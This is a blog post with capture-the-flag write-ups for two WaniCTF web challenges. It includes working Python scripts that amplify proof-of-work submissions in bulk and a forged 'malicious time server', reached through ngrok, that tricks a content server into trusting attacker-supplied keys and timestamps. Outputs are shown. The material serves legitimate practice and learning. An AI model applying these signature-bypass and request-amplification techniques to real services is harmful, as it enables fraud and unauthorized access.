---
layout: post
title: "The Summer of Challs: Week 7"
date: 2024-06-23
categories: CTFs
---

This week, I tried some very cool web challenges from WaniCTF. The last two I solved actually had some pretty interesting concepts. Here are the writeups for two that I was able to solve:

## POW (PROOF OF WORK)

I opened the app to see a "client status" number slowly rising, as well as some output labeled "server response":

![PoW](/assets/ProofOfWork.jpg)

Presumably, when our progress hits 1,000,000, we will get the flag from the server. 

Here is some of the javascript behind the web app. I provided some comments to make the code clearer:

```Javascript
function hash(input) { //input parameter is passed in. Result is set equal to what is passed in. then, it is hashed with sha256 10 times. 
    let result = input;
    for (let i = 0; i < 10; i++) {
      result = CryptoJS.SHA256(result);
    }
    return (result.words[0] & 0xFFFFFF00) === 0; //Takes the first 32 bits of the resulting hash and ANDs it to 4294967040. Checks if equivalent to 0
  }
  async function send(array) { //This function takes in an array. Then it sets the innertext of the server-response element to the response it gets from the pow api. 
    document.getElementById("server-response").innerText = await fetch( //It posts the array passed in and passes the response into the element. 
      "/api/pow",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(array),
      }
    ).then((r) => r.text());
  }
  let i = BigInt(localStorage.getItem("pow_progress") || "0"); // i = either a very big number or 0
  async function main() {
    await send([]); //starts by sending an array to the api (empty array)
    async function loop() { 
      document.getElementById(
        "client-status"
      ).innerText = `Checking ${i.toString()}...`; //sets inner text to checking and then whatever i is. 
      localStorage.setItem("pow_progress", i.toString()); //creates an item "pow_progress" and sets it to whatever i is
      for (let j = 0; j < 1000; j++) { //loops 1000 times
        i++; //iterates i
        if (hash(i.toString())) { //If the current number returns true when passed into the hash function
          await send([i.toString()]); //The js then sends the number to the api, and we make some progress
        }
      }
      requestAnimationFrame(loop);
    }
    loop();
  }
  main();


  for(let h = 0; h < 1000000; h++){
    if(hash[h]) console.log(h)
  }
```

To sum up what is going on, the web app is taking numbers and hashing them repeatedly with SHA256. Then, it does an & operation with the first 32 bits of this result and the hexadecimal number 0xFFFFFF00 - if the result is 0, the function returns true. In order for the result to be 0, the first 32 bits have to all be 0.

What this means is that the `hash(input)` function will very rarely return true, because most numbers when hashed 10 times don't have all 32 of their first bits set to 0. And as we see later in the code, we only really make progress when the frontend sends something to the pow API, and something is only set upon the `hash(input)` function returning true.

What determines the numbers being hashed? 0 is the first number, and then it is incremented by 1. We can't exactly wait to count to infinity and get to a million in our progress, so how can we speed things up? 

For the first time, I opened up Burp Suite and used the intruder to capture when something was sent to the API. By doing this, I could find a working number that made the `hash(input)` function return true. From this I was able to find that the number 7844289 worked.

I tried repeatedly sending this to the API, hoping that it would keep updating the progress until we reached 1,000,000. However, this didn't work - somehow the server detected that too many requests were being made and stopped us, setting a limit. 

Looking again at the code, I figured out that the numbers are being sent in an array. If we fill this array with copies of the same working number, we could achieve 1,000,000 hits within less requests, if the server is counting each element in the array as a hit. 

I had to then play with the maximum array size, because arrays that were too long returned a response along the lines of "needs to be sent as a string array". I finally was able to settle on a 90,000 element array, which I would only have to send a little over 10 times. I then wrote this script, which would do just that:

```Python
import requests

cookies = {
    'pow_session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiI1YmY4ZDdlYy1hY2U2LTRiNDYtOWIyNy0xNTg3ZDkyN2Y4MDUifQ.rGC_1oddc1Ou6vFlPop2akhrmRHP8HDn8mPepV23R_s',
}

headers = {
    'Host': 'web-pow-lz56g6.wanictf.org',
    'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126"',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Accept-Language': 'en-US',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
    'Accept': '*/*',
    'Origin': 'https://web-pow-lz56g6.wanictf.org',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://web-pow-lz56g6.wanictf.org/',
    'Priority': 'u=1, i',
}

json_data = ['7844289'] * 90000

for i in range(1000):
    response = requests.post(
    'https://web-pow-lz56g6.wanictf.org/api/pow',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    print(response.content)
```

This incremented our progress in large amounts, and eventually gave us the flag. While I ran the script in the terminal, the flag was actually rendered in the browser as well, due to passing our cookie and various headers:

![PoW](/assets/PoWFlag.jpg)

## ONE DAY ONE LETTER

This is perhaps the best solve I have done on the blog so far. We see this when we open the web app:

![One Day One Letter](/assets/OneDayOneLetter.jpg)

Similar to the last challenge, we can't just wait multiple days to get the flag. In this case, we get a new letter each day. But where are these letters being pulled from? How is the date and time being determined and checked?

These questions are all answered by the front end javascript and the source code of the servers it interacts with:

```Javascript
const contentserver = 'web-one-day-one-letter-content-lz56g6.wanictf.org'
const timeserver = 'web-one-day-one-letter-time-lz56g6.wanictf.org'

function getTime() {
    return new Promise((resolve) => {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://' + timeserver);
        xhr.send();
        xhr.onload = () => {
            if(xhr.readyState == 4 && xhr.status == 200) {
                resolve(JSON.parse(xhr.response))
            }
        };
    });
}

function getContent() {
    return new Promise((resolve) => {
        getTime()
        .then((time_info) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://' + contentserver);
            xhr.setRequestHeader('Content-Type', 'application/json')
            const body = {
                timestamp : time_info['timestamp'],
                signature : time_info['signature'],
                timeserver : timeserver
            };
            xhr.send(JSON.stringify(body));
            xhr.onload = () => {
                if(xhr.readyState == 4 && xhr.status == 200) {
                    resolve(xhr.response);
                }
            };
        });
    });
}

function initialize() {
    getContent()
    .then((content) => {
        document.getElementById('content').innerHTML = content;
    });
}

initialize();
```

This tells a lot about the app. Upon initialization, it calls the function `getContent()`, which calls `getTime()`. `getTime()` makes a GET request to a seperate server (web-one-day-one-letter-time-lz56g6.wanictf.org) which is labelled as `timeserver` in the code. Whatever it returns (some JSON data) is parsed. A POST request is made with this parsed data to a "content server" (`web-one-day-one-letter-content-lz56g6.wanictf.org`). Specifically, a timestamp, signature (these are gotten through the GET request to the timeserver), and the url of the timeserver are all POSTed to the content server. The server response is then place in the original app's HTML, to display what we see when we open the challenge.

Before I continue, I would like to make it clear that we are dealing with three different servers: the server that hosts the app we see through the challenge, the time server, and the content server.

I think it's important to quickly go over some crytography concepts before we analyze the source code of the various servers - specifically, asymmetric cryptography. 

In asymmetric cryptography (also known as public key cryptography), a party that wants to send/receive messages has a public and private key. The public key can be seen by everyone, while the private key can only be seen by whoever owns it. These public and private keys have two important features. The first is that they can be used to encrypt information, rendering it unreadable. The second is that they are mathematically linked, in that whatever is encrypted by one key can be decrypted by the other. 

This can be used in two main ways. Let's say someone wants to send a message to a specific party, and wants no one else to see it. The sender can use the public key of the receiver to encrypt the message. After this happens, no one else can decrypt the message, because it can only be decrypted and read by the owner of the private key paired with the public key that was used for encryption - obviously, the owner is the intended receiver.  

However, this isn't the use case involved in this challenge. 

The second main use of asymmetric cryptography is to digitally sign information. Let's say someone wants to send a message that EVERYBODY knows with certainy came from them. The sender can encrypt their message with their private key. The only way for this encrypted message to be read properly is by decrypting it with the sender's public key. While the message can then be read by everyone, it also means that the message couldn't have come from anyone else but the owner of the private key linked to that public key.

The challenge is using a type of digital signature called the Digital Signature Standard (DSS), which returns a signature. DSS takes a private key, a message (that is hashed), a random number, creates a signature. The receiver of the message can use the hashed message, signature, and sender's public key to effectively verify that it came from the sender. This is a practical application of the second use case of assymetrical cryptography, as described above. 

The timeserver actually returns a timestamp (this is the message that was hashed) and a signature. It also provides a public key for verification:

```python
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

key = ECC.generate(curve='p256') ## private key is generated
pubkey = key.public_key().export_key(format='PEM')

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pubkey':
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = pubkey
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        else:
            timestamp = str(int(time.time())).encode('utf-8')
            h = SHA256.new(timestamp)
            signer = DSS.new(key, 'fips-186-3')
            signature = signer.sign(h)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = json.dumps({'timestamp' : timestamp.decode('utf-8'), 'signature': signature.hex()})
            self.wfile.write(res_body.encode('utf-8'))

handler = HTTPRequestHandler
httpd = HTTPServer(('', 5001), handler)
httpd.serve_forever()
```

The timestamp as we can see is generated from the `time.time() function` and casted to an int. This creates what is known as a Unix timestamp - it is essentially a large integer that represents a date and time. This timestamp is hashed and used along with the private key to create a signature. The returned timestamp, signature, and url of the timeserver is then passed as a POST request to the content server. Here is how it is handled:

```Python
import json
import os
from datetime import datetime
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.request import Request, urlopen
from urllib.parse import urljoin

from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

FLAG_CONTENT = os.environ.get('FLAG_CONTENT', 'abcdefghijkl') # this will set FLAG_CONTENT to to either the flag or abcdefghijkl
assert len(FLAG_CONTENT) == 12 #makes sure flag is 12 characters long
assert all(c in 'abcdefghijklmnopqrstuvwxyz' for c in FLAG_CONTENT) #my guess is that this is saying the flag should only contain letters

def get_pubkey_of_timeserver(timeserver: str):
    req = Request(urljoin('https://' + timeserver, 'pubkey')) ##opens a server with url that we passed in (timeserver) and goes to the pubkey endpoint
    with urlopen(req) as res:
        key_text = res.read().decode('utf-8') ##response decodes the request (whatever pubkey is) so we get the encrypted pubkey
        return ECC.import_key(key_text) ##then the public key is returned. So basically this gets the public key of the timeserver, like it says

def get_flag_hint_from_timestamp(timestamp: int): 
    content = ['?'] * 12 #makes an array of 12 question mark strings
    idx = timestamp // (60*60*24) % 12 #whatever timestamp we pass in, divided (and then floored) by 60*60*24. Then mod by 12
    content[idx] = FLAG_CONTENT[idx] # now one of the question marks is set to one of the characters of the flag
    return 'FLAG{' + ''.join(content) + '}' ## and returned

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200, "ok")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        try:
            nbytes = int(self.headers.get('content-length'))
            body = json.loads(self.rfile.read(nbytes).decode('utf-8')) #something is posting, and we read and decode bytes from it

            timestamp = body['timestamp'].encode('utf-8') # encodes the timestamp passed in from the post in utf-8 
            signature = bytes.fromhex(body['signature']) # gets the bytes from the hex in signature
            timeserver = body['timeserver'] # Gets the url of the timeserver (to be used in the next line)

            pubkey = get_pubkey_of_timeserver(timeserver) #gets the public key
            h = SHA256.new(timestamp) #hashes the timestamp
            verifier = DSS.new(pubkey, 'fips-186-3') #Verifying the signature and the source of the timestamp
            verifier.verify(h, signature) # Verifying the signature and the source of the timestamp
            self.send_response(HTTPStatus.OK) 
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            dt = datetime.fromtimestamp(int(timestamp)) # this gets the date into a readable format
            res_body = f'''<p>Current time is {dt.date()} {dt.time()}.</p>
<p>Flag is {get_flag_hint_from_timestamp(int(timestamp))}.</p>
<p>You can get only one letter of the flag each day.</p>
<p>See you next day.</p>
'''
            self.wfile.write(res_body.encode('utf-8')) 
            self.requestline
        except Exception:
            self.send_response(HTTPStatus.UNAUTHORIZED)
            self.end_headers()

handler = HTTPRequestHandler
httpd = HTTPServer(('', 5000), handler)
httpd.serve_forever()
```

I provided some comments to make it slightly more clear. What happens is actually quite simple: it is just performing the verification algorithm with the public key of the timeserver, the timestamp, and the signature. If it returns true, it grabs a character from an array containing the entire flag and displays it (each date is divisible into 12 and can then correspond to a specific index in the array).

At this point, it should be clear why just making a POST request to the content server with a different timestamp will not work: we don't have a matching signature and public key. The verification check will fail, and as the source code shows, the HTTP code for unauthorized (401) will be returned. 

So what should we do? My solution was to create a malicious time server that behaved like the original, with a few key changes. Once I did this, I could generate my own public key, my own signatures, and my own timestamps. I could then make a POST request with the URL of this false time server, a new timestamp, and its corresponding signature. The content servers' verfication algorithm would then verify it, and we could get another character from the flag. 

Creating the malicious time server was quite easy - I mostly just copied and pasted the code from the original one, and added a few changes:

```Python
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

key = ECC.generate(curve='p256') 
pubkey = key.public_key().export_key(format='PEM')
currentTime = 1719683483 #this is the next day and should theoretically get us the next letter in the flag

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pubkey':
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = pubkey
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        else:
            global currentTime
            timestamp = str(currentTime).encode('utf-8')
            h = SHA256.new(timestamp)
            signer = DSS.new(key, 'fips-186-3')
            signature = signer.sign(h)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = json.dumps({'timestamp' : timestamp.decode('utf-8'), 'signature': signature.hex()})
            currentTime += 86400
            self.wfile.write(res_body.encode('utf-8'))
handler = HTTPRequestHandler
httpd = HTTPServer(('', 5001), handler)
httpd.serve_forever()
```

You can see I added the variable `currentTime`, which I set to the day AFTER the current day I was solving the challenge. It pretty much does everything the original time server does after that. However, on every GET request (besides to `/pubkey`), the `currentTime` variable is incremented by 86,400. This increments a unix timestamp by a day. 

Everytime our malicious time server is accessed, it returns a timestamp with a corresponding signature. Then, the timestamp is incremented to represent the next day. When it is accessed again, a new corresponding signature is generated to match this new timestamp. 

I tested this out in Burp Suite to try and see if I could get the next letter in the flag, and sure enough it did work:

![Proof of Work](/assets/PoWBurp.jpg)

I then wrote a script to repeatedly POST to the content server with each new timestamp and signature generated by my server: 

```python
import requests
import time

currentTime = 1719683483
headers = {
    'Host': 'web-one-day-one-letter-content-lz56g6.wanictf.org',
    'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126"',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Accept-Language': 'en-US',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://web-one-day-one-letter-lz56g6.wanictf.org',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://web-one-day-one-letter-lz56g6.wanictf.org/',
    'Priority': 'u=1, i',
}
print("Flag starts with this: FLAG{?????t??????}.")
i = 0
while i < 12:
    signature = input("Enter signature: ")
    json_data = {
        'timestamp': str(currentTime),
        'signature': signature,
        'timeserver': 'b82b-2600-387-15-2912-00-c.ngrok-free.app',
    }

    response = requests.post(
        'https://web-one-day-one-letter-content-lz56g6.wanictf.org/',
        headers=headers,
        json=json_data,
    )
    print(response.content)

    currentTime += 86400
```

I ran the script, and I was able to get all the letters of the flag displayed in my terminal:

```
Flag starts with this: FLAG{?????t??????}.
Enter signature: 27753f79092021253b7becbaee9b6fd90a0a2b0ae1b57137462ca98bf26ce377a058587f29632197ea1b3bd53dd8e5fe829e9c92bb260d2e875c98dd2f92ef9d
b'<p>Current time is 2024-06-29 17:51:23.</p>\n<p>Flag is FLAG{???????e????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 64a9a276dc37c2ff30894994876ff926395b65833dbb1bb3fe630f8e6688882d647b890219e67e0209dd6137626af0f9329281955e5e935fc0536f1d636e9790
b'<p>Current time is 2024-06-30 17:51:23.</p>\n<p>Flag is FLAG{????????t???}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 03dec666f75f37d32ae14a06c5f4abbe702ec6cc0be597b3885611f62ebabd8c6b37c850abc03efeb18c162bf6c8f2c8a17449cd5f01697c7283fddc8a9619da
b'<p>Current time is 2024-07-01 17:51:23.</p>\n<p>Flag is FLAG{?????????i??}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 80a3a903717accd2283a4c410226c170f228ddd59817156ca7d6361d16aac7777a9982f723f5d15f84dfa22cba54ba1d05906f3fe65db27d586696f59a2c9209
b'<p>Current time is 2024-07-02 17:51:23.</p>\n<p>Flag is FLAG{??????????m?}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: e298b66ec280688f7dc02d2674cc6c60b866e37fe415c7ed5a635d0b74b6ec813984abb535e6e4afdbcaed15d8e4002bd7d07c1edf99bd6e248cb99dbe013e20
b'<p>Current time is 2024-07-03 17:51:23.</p>\n<p>Flag is FLAG{???????????e}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 1a0d1a86bcdebb2cd674338fc259b8c54103ba2c1f03193f9a6bc18970ddb4ede58eee6c2c8a371700438069b94f89c78eba39647d3edb7b342076f69bc4618d
b'<p>Current time is 2024-07-04 17:51:23.</p>\n<p>Flag is FLAG{l???????????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: db4e8ac60e5c17cac8903692264fd1847be7a527983f7f1d92e1e64991f1461ac4403ee0f6a03004fea99e03bb14faf413d89f013f960a9c07347f364a8febe1
b'<p>Current time is 2024-07-05 17:51:23.</p>\n<p>Flag is FLAG{?y??????????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 9088310f6101e86ffcf0c3f4b6fa72b2032d2645efe78e004a89cd524d14cba982f8bbcd865e7b3db6e65c084587313a3af5892bd748cf1c7dac408cbbe3a494
b'<p>Current time is 2024-07-06 17:51:23.</p>\n<p>Flag is FLAG{??i?????????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 1230f2d6a8b74a5a1188faf5d3d89606c60019281e0f081c7062f24bed0f0cf9e2d5fcaf7f28232defb8a45cfe972831b7719648f9d78e2b001637c9ff8950b2
b'<p>Current time is 2024-07-07 17:51:23.</p>\n<p>Flag is FLAG{???n????????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 6c471762cb5d05bc95d93e6731122d9be3aa8da5b49ff646b210aa2036b7029f6cacdc083ae8865ec97b973498911d3805e16f5760ad1697cf7914e31438818c
b'<p>Current time is 2024-07-08 17:51:23.</p>\n<p>Flag is FLAG{????g???????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 5b1a73ff857c233886ae06970e37972a85a6bb6e81d0064fa013c770c4fc4fa38caaa1e310f4b9296ac3aabda415bdff3312b22341e9f1841892ae0d61e4aced
b'<p>Current time is 2024-07-09 17:51:23.</p>\n<p>Flag is FLAG{?????t??????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
Enter signature: 8e3c77113e7b23202cdd3e55541182f05dc8e9d10007fef1f62dd6d189747979b919b79287f93a2e98157e85bf67aeb1d09dc2b4c06fe4c7bf4b4747856a4d1e
b'<p>Current time is 2024-07-10 17:51:23.</p>\n<p>Flag is FLAG{??????h?????}.</p>\n<p>You can get only one letter of the flag each day.</p>\n<p>See you next day.</p>\n'
```

I manually assembled it to get the flag: FLAG{lyingthetime}.


These challenges weren't so easy. I am pretty happy with the progress I have made, and I really liked how educational these challenges were. I think the way I solved these emphasizes the need for some level of scripting skills and reading code - a lot of times, the solution comes into reach by understanding code very well. On another note, Burp Suite is very cool, and I will certainly continue using it. 

I hope to continue the usual next week, but I will also be posting some progress on personal projects soon. 




